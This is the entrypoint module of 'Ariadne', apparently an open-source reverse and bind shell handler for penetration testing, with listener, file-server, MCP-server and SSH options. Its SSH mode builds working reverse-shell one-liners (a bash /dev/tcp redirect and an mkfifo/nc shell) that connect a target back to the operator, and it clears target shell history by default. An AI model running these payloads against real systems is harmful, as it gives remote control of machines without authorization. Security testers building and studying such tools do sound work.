#!/usr/bin/env python3

# Copyright (c) 2021 - 2026 brightio <brightiocode@gmail.com>
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

# This is the package entrypoint / bootstrap module: it imports every
# submodule, creates the long-lived singletons (options, loggers, core,
# menu) in the right order, injects them into the modules that need them
# (see the 'injected by' comments in display.py/cli_input.py/network.py/
# core.py/engine.py/modules.py/fileserver.py/mcp_server.py), and defines
# main(). All of this runs at IMPORT time, not only when main() is called
# -- that is intentional and matches the original single-file tool, which
# can be imported by other Python exploit scripts to reuse the listener/
# session engine in the same process (see extras/exploit_examples).

from .compat import *
from .compat import __program__, __version__
from . import options as options_mod, log as log_mod, display, cli_input
from . import network, core as core_mod, modules as modules_mod, engine, fileserver, mcp_server
from .options import options
from .log import logger, cmdlogger
from .display import paint, Interfaces, HelpFormatter
from .core import Core
from .network import TCPListener, Connect
from .engine import Session, MainMenu, Messenger, Stream, agent, listener_menu
from .modules import modules, Module
from .fileserver import FileServer
from .mcp_server import MCPServer
from .utils import check_urls, get_glob_size
from .cli_input import keyboard_interrupt, my_input
from .modules import meterpreter, traitor, ngrok
from .options import _cleanup_ephemeral

#################### PROGRAM LOGIC ####################

# Check Python version
if not sys.version_info >= (3, 7):
	print("(!) Ariadne requires Python version 3.7 or higher (!)")
	sys.exit(1)

# Set umask
os.umask(0o007)

# Store initial TTY settings
try:
	TTY_NORMAL = termios.tcgetattr(sys.stdin)
except (termios.error, ValueError):
	TTY_NORMAL = None

def restore_tty():
	if TTY_NORMAL is not None:
		termios.tcsetattr(sys.stdin, termios.TCSADRAIN, TTY_NORMAL)


def WinResize(num, stack):
	if core.attached_session is not None and core.attached_session.type == "PTY":
		core.attached_session.update_pty_size()


def custom_excepthook(*args):
	if len(args) == 1 and hasattr(args[0], 'exc_type'):
		exc_type, exc_value, exc_traceback = args[0].exc_type, args[0].exc_value, args[0].exc_traceback
	elif len(args) == 3:
		exc_type, exc_value, exc_traceback = args
	else:
		return
	try:
		restore_tty()
		os.write(sys.stdout.fileno(), b"\x1b[?25h")
	except (OSError, termios.error):
		pass
	print("\n", paint('Oops...').RED, '\n', paint().yellow, '─' * 80, sep='')
	sys.__excepthook__(exc_type, exc_value, exc_traceback)
	print('─' * 80, f"\n{paint('Ariadne version:').red} {paint(__version__).green}")
	print(f"{paint('Python version:').red} {paint(sys.version).green}")
	print(f"{paint('System:').red} {paint(platform.version()).green}\n")


def _restore_terminal():
	try:
		restore_tty()
		os.write(sys.stdout.fileno(), b"\x1b[?25h")
	except Exception:
		pass
atexit.register(_restore_terminal)


def _dump_all_stacks(signum, frame):
	"""Dev-mode diagnostics: dump every thread's stack to a file so wedge
	states can be inspected from outside the process (SIGUSR1)."""
	try:
		import traceback
		frames = sys._current_frames()
		with open('/tmp/ariadne_stacks.txt', 'w') as f:
			for thread in threading.enumerate():
				fr = frames.get(thread.ident)
				f.write(f"=== {thread.name} daemon={thread.daemon} alive={thread.is_alive()}\n")
				if fr is not None:
					f.write(''.join(traceback.format_stack(fr)))
				else:
					f.write("(no frame)\n")
	except Exception:
		pass


if options.dev_mode:
	try:
		signal.signal(signal.SIGUSR1, _dump_all_stacks)
	except (OSError, ValueError):
		pass

# Python Agent code (embedded verbatim into deployed sessions)
GET_GLOB_SIZE = inspect.getsource(get_glob_size)
MESSENGER = inspect.getsource(Messenger)
STREAM = inspect.getsource(Stream)
AGENT = inspect.getsource(agent)

# Python modifications
original_input = input
input = my_input
sys.excepthook = custom_excepthook
threading.excepthook = custom_excepthook
tarfile.DEFAULT_FORMAT = tarfile.PAX_FORMAT
signal.signal(signal.SIGWINCH, WinResize)

## Create basic objects
core = Core()
menu = MainMenu(histfile=options.cmd_histfile, histlen=options.histlength)
start = menu.start
Listener = TCPListener

# Inject the late-bound singletons into every module whose classes/functions
# reference them as bare globals (see the "injected by" comments in each
# module). This mirrors how the original single-file version worked: those
# names were just module globals, created once near the bottom of the file
# and looked up at call time by code defined earlier in the same file.
for _mod in (display, cli_input, network, core_mod, engine, modules_mod, fileserver, mcp_server):
	_mod.core = core
for _mod in (core_mod, engine, modules_mod):
	_mod.menu = menu
display.logger = logger
display.options = options
# display's logging formatter reads the active input line when available.
# cli_input owns the optional readline import, so wire it after both modules
# have loaded (importing readline here would break the existing import order).
display.readline = cli_input.readline

# A handful of other names are bare module globals in the original
# single-file tool (the `input` swap, the restored-TTY helper, the custom
# excepthook, and the embedded agent-source strings) and are referenced the
# same way -- as call-time globals -- by code that now lives in other
# modules, so they need the same injection treatment.
for _mod in (cli_input, engine, modules_mod):
	_mod.input = my_input
cli_input.original_input = original_input
cli_input.custom_excepthook = custom_excepthook
engine.restore_tty = restore_tty
engine.GET_GLOB_SIZE = GET_GLOB_SIZE
engine.MESSENGER = MESSENGER
engine.STREAM = STREAM
engine.AGENT = AGENT


def load_rc():
	"""Load ~/.ariadne/ariadnerc, if present, and exec it against this
	module's namespace -- the same namespace main() and every singleton
	above live in, so a custom ariadnerc can reference options/core/menu/
	Module/logger/paint/etc. exactly as it could in the original tool."""
	RC = Path(options.basedir / "ariadnerc")
	try:
		st = os.stat(RC)
	except FileNotFoundError:
		RC.touch(mode=0o600)
		return
	if st.st_uid not in (os.getuid(), 0) or (st.st_mode & 0o022):
		logger.error(f"Refusing to load {RC}: writable by others or not owned by you "
			f"(mode {oct(st.st_mode & 0o777)})")
		return
	with open(RC, "r") as rc:
		exec(rc.read(), globals())


engine.load_rc = load_rc


def main():

	## Command line options
	parser = ArgumentParser(description="Ariadne Shell Handler", add_help=False,
		formatter_class=lambda prog: HelpFormatter(prog, width=150, max_help_position=40))

	parser.add_argument("-p", "--ports", help=f"Ports (comma separated) to listen/connect/serve, depending on -i/-c/-s options\n\
(Default: {options.default_listener_port}/{options.default_bindshell_port}/{options.default_fileserver_port})")
	parser.add_argument("args", nargs='*', help="Arguments for -s/--serve and SSH reverse shell modes")

	method = parser.add_argument_group("Reverse or Bind shell?")
	method.add_argument("-i", "--interface", help="Local interface/IP to listen. (Default: 0.0.0.0)", metavar='')
	method.add_argument("-c", "--connect", help="Bind shell Host", metavar='')
	method.add_argument("-j", "--jump", help="Reverse shell jump endpoints", action="append", metavar='')

	hints = parser.add_argument_group("Hints")
	hints.add_argument("-a", "--payloads", help="Show sample reverse shell payloads for active Listeners", action="store_true")
	hints.add_argument("-l", "--interfaces", help="List available network interfaces", action="store_true")
	hints.add_argument("-h", "--help", action="help", help="show this help message and exit")

	log_group = parser.add_argument_group("Session Logging")
	log_group.add_argument("-L", "--no-log", help="Disable session log files", action="store_true")
	log_group.add_argument("-T", "--no-timestamps", help="Disable timestamps in logs", action="store_true")
	log_group.add_argument("-CT", "--no-colored-timestamps", help="Disable colored timestamps in logs", action="store_true")

	misc = parser.add_argument_group("Misc")
	misc.add_argument("-M", "--menu", help="Start in the Main Menu", action="store_true")
	misc.add_argument("-m", "--maintain", help="Keep N sessions per target", type=int, metavar='')
	misc.add_argument("-S", "--single-session", help="Accommodate only the first created session", action="store_true")
	misc.add_argument("-ms", "--max-sessions", help="Max active sessions per host (default 5, 0 = reject all new)", type=int, metavar='')
	misc.add_argument("-C", "--no-attach", help="Do not auto-attach on new sessions", action="store_true")
	misc.add_argument("-U", "--no-upgrade", help="Disable shell auto-upgrade", action="store_true")
	misc.add_argument("--keep-bracketed-paste", help="Do not strip bracketed paste markers (\\x1b[200~ / \\x1b[201~) from pasted input in Raw sessions", action="store_true")
	misc.add_argument("-H", "--keep-history", help="Keep target shell history (do not set HISTFILE=/dev/null)", action="store_true")
	misc.add_argument("-O", "--oscp-safe", help="Enable OSCP-safe mode", action="store_true")
	misc.add_argument("--no-disk", help="Keep all state in RAM (tmpfs); nothing persists to disk", action="store_true")

	mcp = parser.add_argument_group("MCP")
	mcp.add_argument("--mcp", help="Enable the MCP server over local HTTP (HTTPS when --mcp-cert/--mcp-key are set)", action="store_true")
	mcp.add_argument("--mcp-host", help="Host/IP to bind (default: 127.0.0.1)", type=str, metavar='')
	mcp.add_argument("--mcp-port", help="Port to bind (default: saved port, else a random free port persisted to ~/.ariadne/mcp.json)", type=int, metavar='')
	mcp.add_argument("--mcp-token", help="Bearer token (default: saved token, else auto-generated and persisted)", type=str, metavar='')
	mcp.add_argument("--mcp-cert", help="TLS certificate PEM for the MCP HTTPS server", type=str, metavar='')
	mcp.add_argument("--mcp-key", help="TLS private key PEM for the MCP HTTPS server", type=str, metavar='')

	fileserver_group = parser.add_argument_group("File server")
	fileserver_group.add_argument("-s", "--serve", help="Run HTTP file server mode", action="store_true")
	fileserver_group.add_argument("-prefix", "--url-prefix", help="URL path prefix", type=str, metavar='')
	fileserver_group.add_argument("-u", "--upload", help="Enable file upload (PUT/POST) to the server", action="store_true")
	fileserver_group.add_argument("-ud", "--upload-dir", help="Directory to store uploads (default: CWD)", type=str, metavar='')

	debug = parser.add_argument_group("Debug")
	debug.add_argument("-N", "--no-bins", help="Simulate missing binaries on target (comma-separated)", metavar='')
	debug.add_argument("-v", "--version", help="Print version and exit", action="store_true")
	debug.add_argument("-d", "--debug", help="Enable debug output", action="store_true")
	debug.add_argument("-dd", "--dev-mode", help="Enable developer mode", action="store_true")
	debug.add_argument("-cu", "--check-urls", help="Check hardcoded URLs health and exit", action="store_true")

	parser.parse_args(None, options)

	# Modify objects for testing
	if options.dev_mode:
		logger.critical("(!) THIS IS DEVELOPER MODE (!)")

	if options.oscp_safe:
		meterpreter.enabled = False
		traitor.enabled = False
		ngrok.enabled = False

	global keyboard_interrupt
	signal.signal(signal.SIGINT, lambda num, stack: core.stop())

	def _terminate(num, stack):
		core.stop()
		deadline = time.time() + 3
		while core.sessions and time.time() < deadline:
			time.sleep(0.05)
		_restore_terminal()
		_cleanup_ephemeral()
		os._exit(0)
	for _signame in ("SIGTERM", "SIGHUP"):
		_sig = getattr(signal, _signame, None)
		if _sig is not None:
			signal.signal(_sig, _terminate)

	if options.mcp:
		cfg = MCPServer.load_config()
		MCPServer(
			host  = options.mcp_host  or cfg.get('host')  or '127.0.0.1',
			port  = options.mcp_port  or cfg.get('port')  or 0,
			token = options.mcp_token or os.environ.get('ARIADNE_MCP_TOKEN') or cfg.get('token'),
			certfile = options.mcp_cert or None,
			keyfile = options.mcp_key or None,
		).start().save_config()

	# Show Version
	if options.version:
		print(__version__)

	# Show Interfaces
	elif options.interfaces:
		print(Interfaces())

	# Check hardcoded URLs
	elif options.check_urls:
		signal.signal(signal.SIGINT, signal.SIG_DFL)
		check_urls()

	# Main Menu
	elif options.menu:
		signal.signal(signal.SIGINT, keyboard_interrupt)
		menu.show()
		menu.start()

	# File Server
	elif options.serve:
		for port in options.ports:
			server = FileServer(
				*(options.args or (() if options.upload else ('.',))),
				port=port, host=options.interface, url_prefix=options.url_prefix,
				upload=options.upload, upload_dir=options.upload_dir
			)
			if server.filemap or server.upload:
				server.start()
			else:
				logger.error("No files to serve")

	# Reverse shell via SSH
	elif options.args and options.args[0] == "ssh":
		if len(options.args) > 1:
			for port in options.ports:
				TCPListener(host=options.interface, port=port)
				options.args.append(f"HOST=$(echo $SSH_CLIENT | cut -d' ' -f1); PORT={port or options.default_listener_port};"
					f"printf \"(bash >& /dev/tcp/$HOST/$PORT 0>&1) &\"|bash ||"
					f"printf \"(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc $HOST $PORT >/tmp/_) >/dev/null 2>&1 &\"|sh"
				)
		try:
			if subprocess.run(options.args).returncode == 0:
				logger.info("SSH command executed!")
				menu.start()
			else:
				core.stop()
				sys.exit(1)
		except Exception as e:
			logger.error(e)

	# Bind shell
	elif options.connect:
		success = False
		for port in options.ports:
			if Connect(options.connect, port or options.default_bindshell_port):
				success = True
		if not success:
			sys.exit(1)
		menu.start()

	# Reverse Listeners
	else:
		for port in options.ports:
			TCPListener(host=options.interface, port=port, jump=options.jump)
			if not core.listeners:
				sys.exit(1)

		listener_menu()
		signal.signal(signal.SIGINT, keyboard_interrupt)
		menu.start()


load_rc()


if __name__ == "__main__":
	main()
